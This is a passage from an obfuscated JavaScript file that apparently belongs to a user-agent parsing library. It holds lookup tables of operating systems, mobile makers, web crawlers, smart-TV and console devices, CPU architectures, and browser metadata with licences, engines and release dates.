793a(0x56a),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':'Desktop'}},'winnt\x204.0':{'Platform':{'name':_0x2f793a(0x505),'architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':'Computer','type':'Desktop'}},'winn\x5c/t':{'Platform':{'name':_0x2f793a(0x505),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'windows\x2098':{'Platform':{'name':_0x2f793a(0x323),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'win98':{'Platform':{'name':_0x2f793a(0x323),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x2095':{'Platform':{'name':'Windows\x2095','architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'win95':{'Platform':{'name':_0x2f793a(0x5cb),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'win16':{'Platform':{'name':_0x2f793a(0x5ba),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'ppc':_0x2f793a(0x39e),'macintosh|mac\x20os\x20x':_0x2f793a(0x282),'mac_powerpc':_0x2f793a(0x561),'os\x20x':'Mac\x20OS\x20X','ppc\x20mac':_0x2f793a(0x3f0),'android':'Android','webos':'Mobile','mobileexplorer':_0x2f793a(0x587),'palmsource':_0x2f793a(0x302),'palmscape':_0x2f793a(0x435),'motorola':'Motorola','nokia':'Nokia','iphone':_0x2f793a(0x412),'ipad':_0x2f793a(0x340),'ipod':_0x2f793a(0x2e7),'sony':_0x2f793a(0x4e3),'ericsson':_0x2f793a(0x4e3),'blackberry':_0x2f793a(0x22f),'cocoon':_0x2f793a(0x4ac),'blazer':_0x2f793a(0x507),'lg':'LG','amoi':_0x2f793a(0x216),'xda':_0x2f793a(0x321),'mda':_0x2f793a(0x22e),'vario':_0x2f793a(0x4c5),'htc':_0x2f793a(0x423),'samsung':_0x2f793a(0x3f4),'sharp':_0x2f793a(0x34a),'sie-':'Siemens','alcatel':_0x2f793a(0x41e),'benq':'BenQ','ipaq':_0x2f793a(0x273),'mot-':'Motorola','playstation\x20portable':_0x2f793a(0x219),'hiptop':_0x2f793a(0x474),'nec-':_0x2f793a(0x577),'panasonic':_0x2f793a(0x228),'philips':'Philips','sagem':_0x2f793a(0x3c2),'sanyo':_0x2f793a(0x45e),'spv':_0x2f793a(0x291),'zte':_0x2f793a(0x562),'sendo':'Sendo','symbian':_0x2f793a(0x596),'SymbianOS':_0x2f793a(0x5cd),'elaine':_0x2f793a(0x302),'palm':'Palm','series60':_0x2f793a(0x3ce),'windows\x20ce':_0x2f793a(0x4b9),'obigo':_0x2f793a(0x2f1),'netfront':'Netfront\x20Browser','openwave':_0x2f793a(0x3b2),'mobilexplorer':_0x2f793a(0x587),'operamini':_0x2f793a(0x448),'opera\x20mini':'Opera\x20Mini','digital\x20paths':_0x2f793a(0x3e8),'avantgo':'AvantGo','xiino':_0x2f793a(0x26a),'novarra':_0x2f793a(0x33e),'vodafone':'Vodafone','docomo':_0x2f793a(0x575),'o2':'O2','mobile':_0x2f793a(0x253),'wireless':_0x2f793a(0x253),'j2me':_0x2f793a(0x253),'midp':_0x2f793a(0x253),'cldc':_0x2f793a(0x253),'up.link':_0x2f793a(0x253),'up.browser':_0x2f793a(0x253),'smartphone':_0x2f793a(0x253),'cellphone':_0x2f793a(0x253),'Raspbian':{'Platform':{'name':_0x2f793a(0x278),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x3fe)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'Mail.RU_Bot':{'Platform':{'name':_0x2f793a(0x243),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x40b)},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'Googlebot':{'Platform':{'name':_0x2f793a(0x345),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x3b0)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'Baiduspider':{'Platform':{'name':'Baidu\x20Spider','architecture':'32-bit','developer':'Baidu\x20Inc'},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'bingbot':{'Platform':{'name':'Bing\x20Bot','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':'Crawler','type':'Server'}},'msnbot':{'Platform':{'name':_0x2f793a(0x343),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'MJ12bot':{'Platform':{'name':_0x2f793a(0x537),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x2e6)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'Yahoo!\x20Slurp':{'Platform':{'name':_0x2f793a(0x4b6),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x201)},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'MegaIndex.ru':{'Platform':{'name':'MegaIndex\x20Crawler\x20Bot','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x2a1)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'AhrefsBot':{'Platform':{'name':_0x2f793a(0x406),'architecture':'32-bit','developer':_0x2f793a(0x2ce)},'Device':{'name':_0x2f793a(0x3d4),'type':'Server'}},'DotBot':{'Platform':{'name':_0x2f793a(0x4e5),'architecture':_0x2f793a(0x28d),'developer':'The\x20Moz'},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'JobboerseBot':{'Platform':{'name':'Jobboerse\x20Crawler','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x210)},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'SemrushBot':{'Platform':{'name':'SEMRush\x20Crawler','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x30a)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'YandexBot':{'Platform':{'name':_0x2f793a(0x21f),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x523)},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'seoscanners.net':{'Platform':{'name':_0x2f793a(0x3b7),'architecture':'32-bit','developer':'SEO\x20Scanners'},'Device':{'name':_0x2f793a(0x3d4),'type':'Server'}},'SEOkicks-Robot':{'Platform':{'name':_0x2f793a(0x2b2),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x48b)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'CheckMarkNetwork':{'Platform':{'name':_0x2f793a(0x3e1),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x211)},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'BingPreview':{'Platform':{'name':_0x2f793a(0x43d),'architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':_0x2f793a(0x3d4),'type':'Server'}},'VoilaBot\x20BETA':{'Platform':{'name':_0x2f793a(0x43a),'architecture':_0x2f793a(0x28d),'developer':'orange\x20ft\x20group'},'Device':{'name':'Crawler','type':_0x2f793a(0x3c3)}},'adscanner':{'Platform':{'name':'AdScanner\x20Crawler','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x24e)},'Device':{'name':'Crawler','type':'Server'}},'Qwantify':{'Platform':{'name':_0x2f793a(0x299),'architecture':'32-bit','developer':_0x2f793a(0x59c)},'Device':{'name':_0x2f793a(0x3d4),'type':_0x2f793a(0x3c3)}},'apple\x20tv':{'name':_0x2f793a(0x3b8),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x2bb)},'chromecast':{'name':_0x2f793a(0x334),'device':_0x2f793a(0x544),'manufacture':'Google\x20Inc.'},'aftb':{'name':_0x2f793a(0x3c0),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x30c)},'freebox':{'name':_0x2f793a(0x213),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x4b4)},'googletv':{'name':'Google\x20TV','device':_0x2f793a(0x544),'manufacture':'Sony.'},'netbox':{'name':_0x2f793a(0x35a),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x541)},'playstation\x203':{'name':_0x2f793a(0x2cf),'device':_0x2f793a(0x544),'manufacture':'Sony.'},'playstation\x204':{'name':_0x2f793a(0x303),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x541)},'kdl32Cx525':{'name':_0x2f793a(0x29f),'tdeviceype':_0x2f793a(0x544),'manufacture':'Sony.'},'nsz-gs7\x5c/gx70':{'name':_0x2f793a(0x4a4),'device':_0x2f793a(0x544),'manufacture':'Sony.'},'h96\x20pro\x5c+':{'name':_0x2f793a(0x4f3),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x29b)},'mx\x20enjoy\x20tv':{'name':_0x2f793a(0x3fa),'device':_0x2f793a(0x544),'manufacture':'Geniatech.'},'smarttv2016':{'name':_0x2f793a(0x244),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x437)},'smart-tv':{'name':'Smart\x20TV','device':'Television','manufacture':_0x2f793a(0x437)},'tpm171e':{'name':'TPM171E','device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x30b)},'smarttva':{'name':'TV','device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x2df)},'vap430':{'name':_0x2f793a(0x27c),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x317)},'viera':{'name':_0x2f793a(0x563),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x28e)},'webtv':{'name':_0x2f793a(0x547),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x3e0)},'xbox':{'name':'Xbox\x20360','device':_0x2f793a(0x544),'manufacture':'Microsoft.'},'xbox\x20one':{'name':_0x2f793a(0x4fa),'device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x3e0)},'wii':{'name':_0x2f793a(0x4dd),'device':'Television','manufacture':_0x2f793a(0x53c)},'wiiu':{'name':'WiiU','device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x53c)},'x96\x20mini':{'name':'X96\x20mini','device':_0x2f793a(0x544),'manufacture':_0x2f793a(0x564)}},this[_0x2f793a(0x2ba)]={'linux':'linux','mac':_0x2f793a(0x51e),'win':_0x2f793a(0x204),'mobi':_0x2f793a(0x1ff)},this[_0x2f793a(0x333)]={'ARMv1':_0x2f793a(0x341),'ARMv2':_0x2f793a(0x341),'ARMv3':_0x2f793a(0x341),'ARMv4':_0x2f793a(0x341),'ARMv4T':_0x2f793a(0x341),'ARMv5TE':'32\x20bit','ARMv6':_0x2f793a(0x341),'ARMv6-M':_0x2f793a(0x341),'ARMv7-M':_0x2f793a(0x341),'ARMv7E-M':_0x2f793a(0x341),'ARMv8-M':_0x2f793a(0x341),'ARMv7-R':_0x2f793a(0x341),'ARMv8-R':_0x2f793a(0x341),'ARMv7-A':_0x2f793a(0x341),'ARMv8-A':'64\x20bit','ARMv8.1-A':_0x2f793a(0x40d),'ARMv8.2-A':_0x2f793a(0x40d),'ARMv8.3-A':'64/32\x20bit','ARMv8.4-A':_0x2f793a(0x40d),'ARMv8.5-A':_0x2f793a(0x40d),'ARMv8.6-A':_0x2f793a(0x40d),'i286':_0x2f793a(0x2c2),'Win16':'16\x20Bit','i386':_0x2f793a(0x491),'i486':_0x2f793a(0x491),'i586':_0x2f793a(0x491),'i686':_0x2f793a(0x491),'i786':_0x2f793a(0x491),'x86':'32\x20Bit','x64':_0x2f793a(0x2d3),'WOW64':_0x2f793a(0x2d3),'Win64':_0x2f793a(0x2d3),'x86_64':_0x2f793a(0x2d3),'x86-64':'64\x20Bit','x64\x5c/x86':'64\x20Bit','IA-64':_0x2f793a(0x2d3),'ARM64':'64\x20Bit','AMD64':'64\x20Bit','Intel64':_0x2f793a(0x2d3)},this[_0x2f793a(0x36c)]={'x11':{'name':_0x2f793a(0x4cf),'type':'X11\x20Window\x20Manager.'},'win':{'name':'Windows\x20Desktop,','type':_0x2f793a(0x568)},'mac':{'name':_0x2f793a(0x4c8),'type':'Mac\x20Window\x20Manager.'}},this[_0x2f793a(0x4c4)]={'007ac9\x20Crawler':{'name':_0x2f793a(0x4ee),'type':_0x2f793a(0x3d4),'ui':'FullTextMode','developer':_0x2f793a(0x33d),'link':'http://crawler.007ac9.net'},'115Browser':{'name':'115\x20Browser','type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x50d),'link':'https://115.com/'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x22d)}],'layout':'Unknown','latest-release':{'version':'Unknown','date':_0x2f793a(0x22d)}},'126BROWSER':{'name':'126\x20BROWSER','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':'Unknown'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x22d),'licence':[{'name':_0x2f793a(0x22d)}],'layout':_0x2f793a(0x22d),'latest-release':{'version':_0x2f793a(0x22d),'date':_0x2f793a(0x22d)}},'1337Browser':{'name':_0x2f793a(0x585),'type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x22d)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x22d),'licence':[{'name':_0x2f793a(0x22d)}],'layout':_0x2f793a(0x22d),'latest-release':{'version':_0x2f793a(0x22d),'date':_0x2f793a(0x22d)}},'1Password':{'name':_0x2f793a(0x536),'type':'Password\x20Manager','ui':_0x2f793a(0x4e9),'creator':[{'name':'AgileBits\x20Inc','link':'https://1password.com/'}],'cost':'Trialware','status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x222),'link':_0x2f793a(0x532)}],'layout':[{'name':_0x2f793a(0x236),'link':_0x2f793a(0x418)}],'latest-release':{'Android':{'version':_0x2f793a(0x224),'date':'May\x204,\x202020'},'iOS':{'version':'7.5.2','date':_0x2f793a(0x48d)},'macOS':{'version':'7.5','date':_0x2f793a(0x460)},'Windows':{'version':_0x2f793a(0x57c),'date':_0x2f793a(0x592)}}},'1stBrowser':_0x2f793a(0x44b),'2345Explorer':_0x2f793a(0x53d),'Mb2345Browser':_0x2f793a(0x2e5),'2345chrome':_0x2f793a(0x270),'360SE':_0x2f793a(0x1fe),'Amaya':{'name':_0x2f793a(0x530),'type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':'W3C','link':_0x2f793a(0x546)},{'name':_0x2f793a(0x545),'link':'http://www.inria.fr/en/'}],'cost':'Free','status':'discontinued','licence':[{'name':_0x2f793a(0x31f),'link':_0x2f793a(0x381)}],'layout':_0x2f793a(0x26b),'latest-release':{'version':_0x2f793a(0x51c),'date':_0x2f793a(0x430)}},'AOL':{'name':'AOL\x20Explorer','type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x528),'link':'https://www.aol.com/'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x39f),'link':_0x2f793a(0x202)}],'layout':[{'name':_0x2f793a(0x236),'link':_0x2f793a(0x418)}],'latest-release':{'version':'1.5','date':_0x2f793a(0x492)}},'Arora':{'name':_0x2f793a(0x359),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x2ae)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x39f),'link':_0x2f793a(0x202)}],'layout':[{'name':'Blink','link':_0x2f793a(0x39b)}],'latest-release':{'version':_0x2f793a(0x46b),'date':_0x2f793a(0x55c)}},'Avant':{'name':_0x2f793a(0x290),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x251)}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':'GPL','link':_0x2f793a(0x4a0)}],'layout':[{'name':'WebKit','link':_0x2f793a(0x3a6)},{'name':_0x2f793a(0x3d0),'link':_0x2f793a(0x57d)},{'name':_0x2f793a(0x236),'link':'https://en.wikipedia.org/wiki/Trident_(layout_engine)'}],'latest-release':{'version':_0x2f793a(0x54b),'date':'March\x2017,\x202020'}},'Basilisk':{'name':_0x2f793a(0x35d),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x309),'link':'https://www.basilisk-browser.org/'}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'}],'layout':[{'name':_0x2f793a(0x301),'link':_0x2f793a(0x3fb)}],'latest-release':{'version':'2020.10.05','date':'5\x20October\x202020'}},'Blisk':{'name':'Blisk','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x218)}],'cost':{'Free':_0x2f793a(0x5bd),'Paid':_0x2f793a(0x469)},'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x39f),'link':_0x2f793a(0x202)}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)},{'name':'V8','link':_0x2f793a(0x566)}],'latest-release':{'version':'12.0.92.83','date':_0x2f793a(0x411)}},'BeakerBrowser':{'name':_0x2f793a(0x44f),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x5ad),'link':_0x2f793a(0x54c)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x2bc),'link':'https://en.wikipedia.org/wiki/MIT_License'}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)}],'latest-release':{'macOS':{'version':'0.8.10','date':'March\x2013,\x202020'},'Windows':{'version':_0x2f793a(0x55e),'date':_0x2f793a(0x4b0)},'Linux':{'version':_0x2f793a(0x55e),'date':_0x2f793a(0x4b0)}}},'Electron':{'name':_0x2f793a(0x2fe),'type':'Electron\x20(software\x20framework)','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x22b),'link':_0x2f793a(0x4c1)}],'cost':_0x2f793a(0x5d0),'status':'Active','licence':[{'name':_0x2f793a(0x2bc),'link':_0x2f793a(0x365)}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x4e4),'date':'23\x20October\x202020'},'Preview\x20release':{'version':_0x2f793a(0x3e2),'date':_0x2f793a(0x306)}}},'Brave':{'name':_0x2f793a(0x3aa),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x2de),'link':_0x2f793a(0x471)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':_0x2f793a(0x560)}],'layout':[{'name':_0x2f793a(0x2a2),'link':'https://en.wikipedia.org/wiki/Blink_(web_engine)'}],'latest-release':{'Android':{'version':_0x2f793a(0x3f2),'date':_0x2f793a(0x298)},'iOS':{'version':_0x2f793a(0x49c),'date':_0x2f793a(0x361)},'macOS':{'version':_0x2f793a(0x312),'date':_0x2f793a(0x21c)},'Windows':{'version':_0x2f793a(0x312),'date':_0x2f793a(0x21c)},'Linux':{'version':'1.15.75','date':_0x2f793a(0x21c)}}},'Camino':{'name':_0x2f793a(0x1fd),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'The\x20Camino\x20Project'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x21e),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'},{'name':_0x2f793a(0x43c),'link':'https://en.wikipedia.org/wiki/GNU_General_Public_License'},{'name':_0x2f793a(0x24f),'link':_0x2f793a(0x357)}],'layout':[{'name':'Gecko','link':_0x2f793a(0x57d)}],'latest-release':{'version':_0x2f793a(0x24c),'date':_0x2f793a(0x354)}},'Cliqz':{'name':'Cliqz','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':'Cliqz\x20GmbH'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x35f),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'}],'layout':[{'name':_0x2f793a(0x3d0),'link':_0x2f793a(0x57d)}],'latest-release':{'Android':{'version':'1.9.7','date':'April\x204,\x202020'},'iOS':{'version':_0x2f793a(0x349),'date':_0x2f793a(0x521)},'macOS':{'version':_0x2f793a(0x24d),'date':_0x2f793a(0x445)},'Windows':{'version':_0x2f793a(0x24d),'date':_0x2f793a(0x445)},'Linux':{'version':_0x2f793a(0x24d),'date':_0x2f793a(0x445)}}},'Edg':{'name':'Microsoft\x20Edge','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x501),'link':_0x2f793a(0x4d7)}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x39f),'link':_0x2f793a(0x202)}],'layout':[{'name':'Blink','link':'https://en.wikipedia.org/wiki/Blink_(web_engine)'}],'latest-release':{'version':_0x2f793a(0x29c),'date':'14\x20October\x202020'}},'Opera':{'name':'Opera','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x498),'link':_0x2f793a(0x256)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':'Proprietary','link':_0x2f793a(0x202)}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':{'version':_0x2f793a(0x217),'date':'14\x20October\x202020'}},'Opera\x20Mobile':{'name':'Opera','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x498),'link':_0x2f793a(0x256)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x39f),'link':'https://en.wikipedia.org/wiki/Proprietary_software'}],'layout':[{'name':_0x2f793a(0x2a2),'link':'https://en.wikipedia.org/wiki/Blink_(web_engine)'}],'latest-release':{'Android':{'version':_0x2f793a(0x549),'date':'July\x2013,\x202020'},'Android\x20(classic)':{'version':'12.1.9','date':_0x2f793a(0x2bd)},'Symbian':{'version':_0x2f793a(0x5ac),'date':'June\x2024,\x202012'},'Windows\x20Mobile':{'version':_0x2f793a(0x4d3),'date':'March\x2016,\x202010'}}},'whale':{'name':'Naver\x20Whale','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x4b2),'link':_0x2f793a(0x21a)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':'Freeware','link':_0x2f793a(0x383)}],'layout':[{'name':'Blink','link':'https://en.wikipedia.org/wiki/Blink_(web_engine)'}],'latest-release':{'Android':{'version':_0x2f793a(0x4d8),'date':_0x2f793a(0x4ab)},'iOS':{'version':_0x2f793a(0x283),'date':'May\x2025,\x202020'},'macOS':{'version':_0x2f793a(0x1f5),'date':_0x2f793a(0x464)},'Windows':{'version':'2.7.100.20','date':_0x2f793a(0x464)},'Linux':{'version':_0x2f793a(0x1f5),'date':_0x2f793a(0x464)}}},'Falkon':{'name':'Falkon','type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x54a),'link':_0x2f793a(0x25d)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x4b1),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)}],'latest-release':[{'version':'3.1.0.75','date':_0x2f793a(0x5a0)}]},'Konqueror':{'name':'Konqueror\x20Browser','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x27f),'link':_0x2f793a(0x5c2)}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x3d7),'link':_0x2f793a(0x2c3)},{'name':_0x2f793a(0x38b),'link':_0x2f793a(0x39b)}],'latest-release':{'Stable\x20release':{'version':'20.08.2','date':_0x2f793a(0x519)},'Preview\x20release':[]}},'YaBrowser':{'name':_0x2f793a(0x500),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Yandex','link':_0x2f793a(0x512)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':'Proprietary','link':'https://en.wikipedia.org/wiki/Proprietary_software'}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)}],'latest-release':{'Android':{'version':_0x2f793a(0x2e3),'date':'July\x2023,\x202020'},'iOS':{'version':_0x2f793a(0x550),'date':'July\x2016,\x202020'},'macOS':{'version':_0x2f793a(0x259),'date':_0x2f793a(0x4ff)},'Windows':{'version':_0x2f793a(0x259),'date':_0x2f793a(0x4ff)},'Linux':{'version':'20.7.2','date':'July\x202020'}}},'QtWebEngine':{'name':_0x2f793a(0x55b),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x2e8),'link':_0x2f793a(0x33f)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x37c),'link':'https://en.wikipedia.org/wiki/BSD_licenses'}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':[{'version':'2020.10.10','date':_0x2f793a(0x404)}]},'Iron':{'name':'SRWare\x20Iron','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x3e5),'link':_0x2f793a(0x5bc)}],'cost':_0x2f793a(0x5d0),'status':'Active','licence':[{'name':_0x2f793a(0x37c),'link':_0x2f793a(0x23a)}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)},{'name':'V8','link':'https://en.wikipedia.org/wiki/V8_(JavaScript_engine)'}],'latest-release':{'Android':{'version':_0x2f793a(0x4c0),'date':_0x2f793a(0x5af)},'macOS':{'version':_0x2f793a(0x29e),'date':_0x2f793a(0x393)},'Windows':{'version':'85.0.4350.0','date':'October\x202,\x202020'},'Linux':{'version':_0x2f793a(0x322),'date':'October\x206,\x202020'}}},'Chrome':{'name':_0x2f793a(0x28f),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Google\x20LLC','link':_0x2f793a(0x49b)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x277),'link':_0x2f793a(0x23a)}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)}],'latest-release':{'Android':{'version':_0x2f793a(0x580),'date':_0x2f793a(0x3d3)},'iOS':{'version':'86.0.4240.93','date':'October\x2012,\x202020'},'macOS':{'version':'86.0.4240.111','date':_0x2f793a(0x5a7)},'Windows':{'version':_0x2f793a(0x4a2),'date':_0x2f793a(0x5a7)},'Linux':{'version':_0x2f793a(0x4a2),'date':'October\x2020,\x202020'}}},'Chromium':{'name':_0x2f793a(0x394),'type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x46e),'link':_0x2f793a(0x233)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x37c),'link':_0x2f793a(0x23a)}],'layout':[{'name':_0x2f793a(0x2a2),'link':_0x2f793a(0x496)}],'latest-release':[{'name':_0x2f793a(0x265),'link':_0x2f793a(0x2b0)}]},'Comodo_Dragon':{'name':_0x2f793a(0x20a),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Comodo\x20Group','link':_0x2f793a(0x4c3)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x37c),'link':_0x2f793a(0x23a)}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':[{'version':'83.0.4103.116','date':_0x2f793a(0x3dc)}]},'IceDragon':{'name':'Comodo\x20Ice\x20Dragon','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x347),'link':_0x2f793a(0x4c3)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'}],'layout':[{'name':_0x2f793a(0x3d0),'link':_0x2f793a(0x57d)}],'latest-release':[{'version':_0x2f793a(0x4a5),'date':_0x2f793a(0x569)}]},'Dillo':{'name':_0x2f793a(0x459),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'The\x20Dillo\x20team','link':_0x2f793a(0x375)}],'cost':'Free','status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':'custom'}],'latest-release':[{'version':'3.0.5','date':'30\x20June\x202015'}]},'Dooble':{'name':_0x2f793a(0x2a7),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Dooble\x20Project\x20Team','link':'https